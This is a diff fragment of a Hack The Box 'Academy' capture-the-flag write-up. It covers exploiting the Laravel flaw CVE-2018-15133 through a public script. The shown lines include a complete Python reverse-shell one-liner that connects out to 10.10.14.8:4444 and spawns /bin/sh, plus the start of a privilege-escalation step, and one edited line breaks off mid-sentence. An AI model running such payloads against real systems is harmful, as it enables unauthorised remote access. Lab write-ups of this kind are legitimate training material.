@@ -30,11 +30,11 @@ Now we can login as created user on admin.php
 There is interesting web page dev-staging-01.academy.htb, we can add it to /etc/host and check its content
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Admin%20panel.PNG)
 
-After some search on the page i noticed "laravel.log" on exception message and then found CVE-2018-15133 exploit that allows to execute code on a vulnerable laravel application 
+After some search on the page i noticed "laravel.log" on exception message and then found CVE-2018-15133 that allows to execute code on a vulnerable laravel application 
 
 There are several exploits for this CVE, i'll use this [python sctipt](https://github.com/aljavier/exploit_laravel_cve-2018-15133)
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/pwn_laravel.PNG)
-
+We need API_KEY to exploit it, luckily we can find it at the 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 TF=$(mktemp -d)
